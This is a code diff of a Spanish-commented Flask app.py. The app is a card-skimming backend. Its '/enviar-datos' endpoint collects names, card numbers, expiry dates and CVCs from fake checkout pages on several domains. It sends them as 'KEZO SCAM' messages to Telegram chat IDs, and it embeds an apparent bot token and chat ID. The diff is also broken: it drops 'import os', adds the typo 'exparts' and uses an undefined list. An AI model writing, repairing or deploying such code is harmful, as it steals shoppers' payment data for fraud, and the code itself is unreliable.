@@ -1,4 +1,4 @@
-import os
+# --- APP.PY LIMPIO - SIN ERRORES ---
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
@@ -6,14 +6,18 @@ import requests
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
-# --- CONFIGURACIÓN CARGADA DE .env ---
-with open('.env', 'r') as f:
-    for line in f:
-        if '=' in line and not line.strip().startswith('#'):
-            key, value = line.strip().split('=', 1)
-            globals()[key] = value
-
-TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN
+# === CONFIGURACIÓN CARGADA DE .env ===
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+    
+    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '9205817824:AAGIHdN7_3fB49pTgNQzG3UFCXeY898oluU')
+    ID_PRINCIPAL = int(os.getenv('ID_PRINCIPAL', 7707049896))
+    
+except ImportError:
+    # Fallback si no se instaló dotenv
+    TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '9205817824:AAGIHdN7_3fB49pTgNQzG3UFCXeY898oluU')
+    ID_PRINCIPAL = int(os.getenv('ID_PRINCIPAL', 7707049896))
 
 # === ESTRUCTURA DE DOMINIOS Y CLIENTES ===
 DOMINIOS_CONFIG = {
@@ -42,7 +46,7 @@ def test_bot():
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)}), 500
 
-# --- ENDPOINT PARA RECIBIR DATOS DEL CHECKOUT ---
+# --- RECIBIR DATOS DEL CHECKOUT ---
 @app.route('/enviar-datos', methods=['POST'])
 def recibir_datos():
     data = request.json
@@ -50,23 +54,22 @@ def recibir_datos():
     origen = request.headers.get('Origin', '').split('/')[2]
 
     nombre = data.get('nombre', 'N/A')
-    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')  # Quita espacios
+    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')
     expiracion = data.get('expiracion', 'N/A')
     cvc = data.get('cvc', 'N/A')
 
     # Separar mes y año
     exp_parts = expiracion.split('/')
-    if len(exp_parts) == 2:
+    if len(exparts) == 2:
         mes = exp_parts[0]
         ano = exp_parts[1]
     else:
         mes = expiracion
         ano = 'N/A'
 
-    # Formato de una línea: NUMERO|MES|AÑO|CVC
+    # Formato NUMERO|MES|AÑO|CVC
     cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"
     
-    # Determinar configuración del dominio correspondiente
     config = DOMINIOS_CONFIG.get(origen, {'clientes_privados': [], 'id_principal': ID_PRINCIPAL})
     id_principal = config['id_principal']
     lista_clientes_privados = [str(i).strip() for i in config['clientes_privados']]
@@ -74,7 +77,6 @@ def recibir_datos():
     # Mensaje para TODOS los clientes del dominio (incluyendo al principal)
     mensaje_unico = f"🔥 *KEZO SCAM - {origen}* 🔥\n━━━━━━━━━━━━━━━━━━\n\n`{cc_linea}`\n\n👤_{nombre}_"
 
-    # Enviar a LOS CLIENTES PRIVADOS del dominio correspondiente
     exitos = 0
     
     for id_receptor in lista_ids_html:
@@ -101,5 +103,5 @@ def recibir_datos():
     return jsonify({"status": "success", "enviados": exitos}), 200
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
+    port = int(os.getenv('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
